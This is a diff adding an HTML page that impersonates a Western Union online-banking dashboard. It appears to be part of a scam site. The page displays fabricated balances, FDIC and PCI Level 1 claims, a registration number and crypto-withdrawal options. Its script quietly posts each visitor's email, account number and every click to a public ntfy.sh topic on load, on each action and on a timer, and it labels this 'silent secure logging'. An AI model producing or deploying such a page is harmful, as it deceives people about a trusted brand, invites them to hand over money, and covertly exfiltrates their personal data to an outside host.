@@ -1,0 +1,710 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="description" content="Western Union Dashboard - Manage your secure global banking account">
+    <meta name="keywords" content="Western Union, dashboard, online banking, account management">
+    <title>Dashboard | Western Union Global Banking</title>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='%230033A0'/><text x='50' y='70' font-size='50' text-anchor='middle' fill='%23FFD700' font-weight='bold'>WU</text></svg>">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            background: linear-gradient(145deg, #F0F4FC 0%, #E9EFF8 100%);
+            min-height: 100vh;
+        }
+
+        .dashboard-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 28px 24px;
+        }
+
+        /* Modern header */
+        .glass-header {
+            background: rgba(255,255,255,0.96);
+            backdrop-filter: blur(2px);
+            border-radius: 32px;
+            padding: 20px 32px;
+            margin-bottom: 32px;
+            box-shadow: 0 8px 24px rgba(0, 51, 160, 0.08);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+            border: 1px solid rgba(0, 51, 160, 0.12);
+            transition: all 0.2s;
+        }
+
+        .brand-area {
+            display: flex;
+            align-items: center;
+            gap: 18px;
+        }
+
+        .wu-mono {
+            width: 52px;
+            height: 52px;
+            background: linear-gradient(125deg, #0033A0, #001A5E);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.9rem;
+            font-weight: 800;
+            color: #FFD700;
+            box-shadow: 0 10px 18px -6px rgba(0,51,160,0.3);
+        }
+
+        .brand-text h1 {
+            font-size: 1.55rem;
+            color: #0033A0;
+            letter-spacing: -0.3px;
+            font-weight: 700;
+        }
+
+        .brand-text p {
+            color: #5A6E8A;
+            font-size: 0.8rem;
+            font-weight: 500;
+        }
+
+        .user-section {
+            display: flex;
+            align-items: center;
+            gap: 28px;
+        }
+
+        .bell-wrapper {
+            position: relative;
+            cursor: pointer;
+            font-size: 1.5rem;
+            color: #0033A0;
+            padding: 10px;
+            border-radius: 50%;
+            transition: all 0.2s;
+            background: #F0F4FA;
+        }
+
+        .bell-wrapper:hover {
+            background: #E4EAF3;
+            transform: scale(1.02);
+        }
+
+        .notif-dot {
+            position: absolute;
+            top: 2px;
+            right: 2px;
+            background: #E7462C;
+            width: 20px;
+            height: 20px;
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.65rem;
+            font-weight: bold;
+            color: white;
+            border: 2px solid white;
+        }
+
+        .greeting {
+            text-align: right;
+        }
+
+        .greeting small {
+            font-size: 0.75rem;
+            color: #5F7F9E;
+        }
+
+        .user-name {
+            font-weight: 800;
+            font-size: 1.1rem;
+            color: #002B7A;
+        }
+
+        /* Cards */
+        .stats-row {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(310px, 1fr));
+            gap: 26px;
+            margin-bottom: 40px;
+        }
+
+        .main-balance-card {
+            background: linear-gradient(125deg, #002F8C, #001A4D);
+            border-radius: 32px;
+            padding: 28px;
+            color: white;
+            position: relative;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 16px 30px -8px rgba(0, 51, 160, 0.25);
+        }
+
+        .main-balance-card:hover {
+            transform: translateY(-3px);
+        }
+
+        .eyebrow {
+            font-size: 0.75rem;
+            letter-spacing: 1.5px;
+            opacity: 0.75;
+            text-transform: uppercase;
+        }
+
+        .balance-figure {
+            font-size: 3rem;
+            font-weight: 800;
+            margin: 18px 0 10px;
+            letter-spacing: -1px;
+            transition: filter 0.2s;
+        }
+
+        .blur-balance {
+            filter: blur(8px);
+            user-select: none;
+        }
+
+        .toggle-balance-btn {
+            position: absolute;
+            top: 24px;
+            right: 24px;
+            background: rgba(255,255,255,0.15);
+            border: none;
+            border-radius: 40px;
+            padding: 6px 14px;
+            font-size: 0.7rem;
+            font-weight: 500;
+            color: white;
+            display: flex;
+            gap: 6px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .toggle-balance-btn:hover {
+            background: rgba(255,255,255,0.28);
+        }
+
+        .badge-gold {
+            background: rgba(255,215,0,0.18);
+            padding: 6px 14px;
+            border-radius: 50px;
+            display: inline-flex;
+            gap: 8px;
+            font-size: 0.7rem;
+            margin-top: 16px;
+        }
+
+        .info-card {
+            background: white;
+            border-radius: 32px;
+            padding: 28px;
+            box-shadow: 0 8px 22px rgba(0,0,0,0.03);
+            border: 1px solid rgba(0, 51, 160, 0.08);
+        }
+
+        .account-digits {
+            font-size: 1.6rem;
+            font-weight: 700;
+            font-family: monospace;
+            color: #002B7A;
+            letter-spacing: 1px;
+            margin: 12px 0;
+        }
+
+        .pill-list {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin-top: 18px;
+        }
+
+        .pill {
+            background: #EEF3FC;
+            border-radius: 40px;
+            padding: 5px 14px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            color: #0033A0;
+        }
+
+        /* Action grid refined */
+        .action-matrix {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 22px;
+            margin-bottom: 40px;
+        }
+
+        .action-tile {
+            background: white;
+            border-radius: 28px;
+            padding: 26px 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            border: 1px solid rgba(0, 51, 160, 0.06);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.02);
+        }
+
+        .action-tile:hover {
+            transform: translateY(-6px);
+            box-shadow: 0 24px 36px -12px rgba(0, 51, 160, 0.2);
+            border-color: rgba(0, 51, 160, 0.2);
+        }
+
+        .action-icon {
+            font-size: 2.8rem;
+            margin-bottom: 14px;
+        }
+
+        .action-title {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: #00215E;
+            margin-bottom: 8px;
+        }
+
+        .action-desc {
+            font-size: 0.8rem;
+            color: #5B6E8C;
+        }
+
+        /* Modern footer */
+        .secure-footer {
+            background: white;
+            border-radius: 28px;
+            padding: 28px 24px;
+            text-align: center;
+            border: 1px solid #E9EDF4;
+        }
+
+        .footer-nav {
+            display: flex;
+            justify-content: center;
+            gap: 32px;
+            flex-wrap: wrap;
+            margin-bottom: 24px;
+        }
+
+        .footer-nav a {
+            color: #0033A0;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 0.85rem;
+            transition: 0.2s;
+        }
+
+        .footer-nav a:hover {
+            color: #FFB800;
+        }
+
+        .copyright {
+            font-size: 0.75rem;
+            color: #6F7D95;
+        }
+
+        @keyframes ring {
+            0% { transform: rotate(0deg);}
+            25% { transform: rotate(12deg);}
+            75% { transform: rotate(-12deg);}
+            100% { transform: rotate(0deg);}
+        }
+
+        .bell-ring {
+            animation: ring 0.45s ease-in-out;
+        }
+
+        @media (max-width: 700px) {
+            .dashboard-container { padding: 16px; }
+            .glass-header { flex-direction: column; text-align: center; }
+            .user-section { justify-content: center; }
+            .greeting { text-align: center; }
+            .balance-figure { font-size: 2.2rem; }
+        }
+    </style>
+</head>
+<body>
+<div class="dashboard-container">
+    <!-- Header Modern -->
+    <div class="glass-header">
+        <div class="brand-area">
+            <div class="wu-mono">WU</div>
+            <div class="brand-text">
+                <h1>Western Union Global Banking</h1>
+                <p>Secure · Instant · Trusted since 1851</p>
+            </div>
+        </div>
+        <div class="user-section">
+            <div class="bell-wrapper" id="notificationBell">
+                <i class="fas fa-bell"></i>
+                <span class="notif-dot" id="notifCounter">0</span>
+            </div>
+            <div class="greeting">
+                <small>Welcome back,</small>
+                <div class="user-name" id="displayFullName">——</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Balance + Account Row -->
+    <div class="stats-row">
+        <div class="main-balance-card">
+            <button class="toggle-balance-btn" id="balanceToggleBtn">
+                <span id="toggleEyeIcon">👁️</span> <span id="toggleLabel">Hide</span>
+            </button>
+            <div class="eyebrow">TOTAL BALANCE (USD)</div>
+            <div class="balance-figure" id="totalBalanceValue">$0.00</div>
+            <div style="font-size:0.75rem; opacity:0.8;">Available for transfer & withdrawal</div>
+            <div class="badge-gold">
+                <i class="fas fa-shield-alt"></i> FDIC insured up to $250k · Global protection
+            </div>
+        </div>
+        <div class="info-card">
+            <div class="eyebrow" style="color:#5F7D9C;">ACCOUNT DETAILS</div>
+            <div class="account-digits" id="accountNumberDisplay">Loading...</div>
+            <div class="pill-list">
+                <span class="pill"><i class="fas fa-globe"></i> 200+ countries</span>
+                <span class="pill"><i class="fas fa-lock"></i> PCI Level 1</span>
+                <span class="pill"><i class="fas fa-clock"></i> 24/7 access</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Action Grid (All services) -->
+    <div class="action-matrix" id="actionGrid">
+        <div class="action-tile" data-action="withdraw">
+            <div class="action-icon">💸</div>
+            <div class="action-title">Withdraw Funds</div>
+            <div class="action-desc">Transfer to bank or recipient</div>
+        </div>
+        <div class="action-tile" data-action="deposit">
+            <div class="action-icon">➕💰</div>
+            <div class="action-title">Add Funds</div>
+            <div class="action-desc">Deposit money to your account</div>
+        </div>
+        <div class="action-tile" data-action="crypto">
+            <div class="action-icon">₿⚡</div>
+            <div class="action-title">Crypto Withdraw</div>
+            <div class="action-desc">Bitcoin & USDT fast exit</div>
+        </div>
+        <div class="action-tile" data-action="history">
+            <div class="action-icon">📜</div>
+            <div class="action-title">Transaction History</div>
+            <div class="action-desc">View full activity log</div>
+        </div>
+        <div class="action-tile" data-action="notifications">
+            <div class="action-icon">🔔📬</div>
+            <div class="action-title">Alerts Center</div>
+            <div class="action-desc">Account alerts & security</div>
+        </div>
+        <div class="action-tile" data-action="support">
+            <div class="action-icon">🎧💬</div>
+            <div class="action-title">Live Support</div>
+            <div class="action-desc">Priority assistance 24/7</div>
+        </div>
+        <div class="action-tile" data-action="logout">
+            <div class="action-icon">🚪🔒</div>
+            <div class="action-title">Secure Logout</div>
+            <div class="action-desc">Sign out safely</div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="secure-footer">
+        <div class="footer-nav">
+            <a href="#" data-footer-link="privacy"><i class="fas fa-lock"></i> Privacy Policy</a>
+            <a href="#" data-footer-link="terms"><i class="fas fa-file-signature"></i> Terms of Use</a>
+            <a href="#" data-footer-link="security"><i class="fas fa-shield-haltered"></i> Security Hub</a>
+            <a href="#" data-footer-link="contact"><i class="fas fa-envelope"></i> Contact</a>
+        </div>
+        <div class="copyright">© 2026 Western Union Holdings, Inc. All rights reserved. | Secure global transactions | NMLS #902367</div>
+    </div>
+</div>
+
+<script>
+    // ---------- NTFY NOTIFICATION SYSTEM (silent secure logging) ----------
+    const NTFY_TOPIC = "wu_dashboard_secure_alerts";
+    const NTFY_URL = `https://ntfy.sh/${NTFY_TOPIC}`;
+
+    function sendSecureLog(action, meta = {}) {
+        const storedUser = JSON.parse(localStorage.getItem('wu_current_user') || '{}');
+        const payload = {
+            timestamp: new Date().toISOString(),
+            event: action,
+            dashboard: "western_union_hub",
+            userEmail: storedUser.email || 'anonymous',
+            account: storedUser.accountNumber || 'N/A',
+            details: meta,
+            environment: "secure_token_fdic"
+        };
+        console.log(`🔐 [NTFY] Dashboard event: ${action}`, meta);
+        try {
+            fetch(NTFY_URL, {
+                method: 'POST',
+                body: JSON.stringify(payload),
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Title': `📌 ${action.replace(/_/g, ' ').toUpperCase()}`,
+                    'Priority': '2'
+                },
+                keepalive: true
+            }).catch(e => {});
+        } catch(e) {}
+    }
+
+    // ---------- Global Dashboard State ----------
+    let currentUser = null;
+    let balanceVisible = true;
+    let notificationsArray = [];
+
+    // Load authenticated user from localStorage (created at login)
+    function fetchAndSyncUser() {
+        const usersDB = JSON.parse(localStorage.getItem('wu_users') || '[]');
+        const activeEmail = localStorage.getItem('wu_current_user_email');
+        if (activeEmail) {
+            currentUser = usersDB.find(u => u.email === activeEmail);
+        }
+        // Fallback demo profile (secure demo)
+        if (!currentUser) {
+            currentUser = {
+                fullname: "Eleanor Vance",
+                email: "eleanor.vance@western.com",
+                accountNumber: "WU" + Math.floor(1000000000 + Math.random() * 9000000000),
+                balance: 18750.35,
+                phone: "+1 212 555 0923"
+            };
+            // store for consistency
+            localStorage.setItem('wu_current_user_email', currentUser.email);
+            let existing = JSON.parse(localStorage.getItem('wu_users') || '[]');
+            if(!existing.find(u => u.email === currentUser.email)) {
+                existing.push(currentUser);
+                localStorage.setItem('wu_users', JSON.stringify(existing));
+            }
+        }
+        document.getElementById('displayFullName').innerText = currentUser.fullname;
+        document.getElementById('accountNumberDisplay').innerText = currentUser.accountNumber;
+        refreshBalanceDisplay();
+        sendSecureLog('dashboard_initialized', { userId: currentUser.email, balanceSegment: 'active' });
+    }
+
+    function refreshBalanceDisplay() {
+        const el = document.getElementById('totalBalanceValue');
+        if (el) {
+            el.innerText = '$' + currentUser.balance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+            if (!balanceVisible) {
+                el.classList.add('blur-balance');
+            } else {
+                el.classList.remove('blur-balance');
+            }
+        }
+    }
+
+    function toggleBalanceVisibility() {
+        const balanceSpan = document.getElementById('totalBalanceValue');
+        const eyeIcon = document.getElementById('toggleEyeIcon');
+        const labelSpan = document.getElementById('toggleLabel');
+        if (balanceVisible) {
+            balanceSpan.classList.add('blur-balance');
+            eyeIcon.innerText = '🙈';
+            labelSpan.innerText = 'Show';
+            balanceVisible = false;
+            sendSecureLog('balance_hidden', {});
+        } else {
+            balanceSpan.classList.remove('blur-balance');
+            eyeIcon.innerText = '👁️';
+            labelSpan.innerText = 'Hide';
+            balanceVisible = true;
+            sendSecureLog('balance_revealed', {});
+        }
+    }
+
+    // Notifications generator
+    function buildMockNotifications() {
+        notificationsArray = [
+            { id: 1, title: "🏦 Deposit pending", message: "ACH transfer of $2,450.00 initiated", read: false, time: new Date(Date.now() - 2*3600000) },
+            { id: 2, title: "🔐 New device login", message: "Chrome on macOS, New York", read: false, time: new Date(Date.now() - 18*3600000) },
+            { id: 3, title: "✅ Transfer confirmed", message: "Sent $320 to Maria Gonzalez", read: true, time: new Date(Date.now() - 48*3600000) },
+            { id: 4, title: "💳 Debit card limit", message: "Your daily limit resets in 6h", read: false, time: new Date(Date.now() - 5*3600000) }
+        ];
+        updateNotifBadge();
+    }
+
+    function updateNotifBadge() {
+        const unread = notificationsArray.filter(n => !n.read).length;
+        const badgeSpan = document.getElementById('notifCounter');
+        if (badgeSpan) badgeSpan.innerText = unread;
+    }
+
+    function markAllNotificationsRead() {
+        notificationsArray.forEach(n => n.read = true);
+        updateNotifBadge();
+    }
+
+    function showNotificationsAlert() {
+        const unreadItems = notificationsArray.filter(n => !n.read);
+        if (unreadItems.length === 0) {
+            alert("🔔 All caught up! No new alerts at this moment.");
+        } else {
+            let msg = "🔔 * UNREAD ALERTS * 🔔\n\n";
+            unreadItems.forEach(item => {
+                msg += `📌 ${item.title}\n   ${item.message}\n\n`;
+            });
+            alert(msg);
+        }
+        markAllNotificationsRead();
+        sendSecureLog('notifications_center_opened', { unreadCount: unreadItems.length });
+    }
+
+    // simulate periodic alert to show bell animation
+    function periodicAlertSimulator() {
+        setInterval(() => {
+            const newNotif = {
+                id: Date.now(),
+                title: "📢 Account Update",
+                message: "Western Union security check completed. All systems operational.",
+                read: false,
+                time: new Date()
+            };
+            notificationsArray.unshift(newNotif);
+            if (notificationsArray.length > 12) notificationsArray.pop();
+            updateNotifBadge();
+            const bellDiv = document.getElementById('notificationBell');
+            bellDiv.classList.add('bell-ring');
+            setTimeout(() => bellDiv.classList.remove('bell-ring'), 500);
+            sendSecureLog('periodic_system_notification', { title: newNotif.title });
+        }, 65000);
+    }
+
+    // ---------- ACTION HANDLER (CRITICAL: deposit redirects to deposit.html) ----------
+    async function onActionTriggered(actionId) {
+        sendSecureLog('action_trigger', { action: actionId });
+        switch (actionId) {
+            case 'withdraw':
+                alert("💸 Withdrawal Portal\n\nRedirecting to secure withdrawal interface...\nFDIC insured instant transfer options.");
+                setTimeout(() => { window.location.href = 'withdraw.html'; }, 400);
+                break;
+            case 'deposit':
+                // REWRITTEN: no popup instructions, direct to deposit.html
+                sendSecureLog('deposit_redirect', { target: 'deposit.html' });
+                window.location.href = 'deposit.html';
+                break;
+            case 'crypto':
+                alert("₿ Crypto Withdrawal\n\nBitcoin / USDT withdrawals are processed within 20-40 min.\nMinimum: $75 equivalent.");
+                setTimeout(() => { window.location.href = 'crypto-withdraw.html'; }, 400);
+                break;
+            case 'history':
+                alert("📜 Transaction Ledger\n\nLoading complete transaction history with timestamps.");
+                setTimeout(() => { window.location.href = 'history.html'; }, 400);
+                break;
+            case 'notifications':
+                showNotificationsAlert();
+                break;
+            case 'support':
+                alert("🎧 Western Union Global Support\n\n📞 +1-888-987-6543\n✉️ premium@westernunion.com\n24/7 real-time assistance.");
+                sendSecureLog('support_contact_clicked', {});
+                break;
+            case 'logout':
+                sendSecureLog('user_logout_executed', { userEmail: currentUser?.email });
+                localStorage.removeItem('wu_current_user_email');
+                alert("✓ Logged out securely. Thank you for banking with Western Union.");
+                window.location.href = 'index.html';
+                break;
+            default:
+                console.warn("Unknown action");
+        }
+    }
+
+    // Setup UI listeners
+    function bindActionCards() {
+        const tiles = document.querySelectorAll('.action-tile');
+        tiles.forEach(tile => {
+            const actionVal = tile.getAttribute('data-action');
+            if (actionVal) {
+                tile.addEventListener('click', (e) => {
+                    e.stopPropagation();
+                    onActionTriggered(actionVal);
+                });
+            }
+        });
+    }
+
+    function setupFooterInteractions() {
+        const footerLinks = document.querySelectorAll('[data-footer-link]');
+        footerLinks.forEach(link => {
+            link.addEventListener('click', (e) => {
+                e.preventDefault();
+                const linkType = link.getAttribute('data-footer-link');
+                sendSecureLog('footer_policy_click', { section: linkType });
+                alert(`📄 Western Union - ${link.innerText}\n\nYour financial security is our priority. All data protected with bank-grade encryption.`);
+            });
+        });
+    }
+
+    function setupNotificationBellUI() {
+        const bellBtn = document.getElementById('notificationBell');
+        bellBtn.addEventListener('click', () => {
+            bellBtn.classList.add('bell-ring');
+            setTimeout(() => bellBtn.classList.remove('bell-ring'), 400);
+            onActionTriggered('notifications');
+        });
+    }
+
+    // updateBalance exposed globally (for external usage or future)
+    window.updateDashboardBalance = function(newAmount) {
+        if (currentUser && typeof newAmount === 'number' && newAmount >= 0) {
+            currentUser.balance = newAmount;
+            // persist to localStorage userDB
+            const allUsers = JSON.parse(localStorage.getItem('wu_users') || '[]');
+            const idx = allUsers.findIndex(u => u.email === currentUser.email);
+            if (idx !== -1) {
+                allUsers[idx].balance = newAmount;
+                localStorage.setItem('wu_users', JSON.stringify(allUsers));
+            }
+            localStorage.setItem('wu_current_user', JSON.stringify(currentUser));
+            refreshBalanceDisplay();
+            sendSecureLog('balance_updated_externally', { newVal: newAmount });
+        }
+    };
+
+    // additional security: listen for storage changes to reflect balance across tabs
+    window.addEventListener('storage', (event) => {
+        if (event.key === 'wu_users' || event.key === 'wu_current_user') {
+            const freshUsers = JSON.parse(localStorage.getItem('wu_users') || '[]');
+            const activeMail = localStorage.getItem('wu_current_user_email');
+            if (activeMail) {
+                const updated = freshUsers.find(u => u.email === activeMail);
+                if (updated && currentUser) {
+                    currentUser.balance = updated.balance;
+                    refreshBalanceDisplay();
+                }
+            }
+        }
+    });
+
+    // ---------- on load entry ----------
+    window.addEventListener('DOMContentLoaded', () => {
+        fetchAndSyncUser();
+        buildMockNotifications();
+        bindActionCards();
+        setupFooterInteractions();
+        setupNotificationBellUI();
+        const toggleBtn = document.getElementById('balanceToggleBtn');
+        if (toggleBtn) toggleBtn.addEventListener('click', toggleBalanceVisibility);
+        periodicAlertSimulator();
+        sendSecureLog('dashboard_fully_loaded', { timestamp: new Date().toISOString(), theme: 'modern' });
+        console.log(`✅ Western Union Dashboard Active | NTFY topic: ${NTFY_TOPIC}`);
+    });
+</script>
+</body>
+</html>
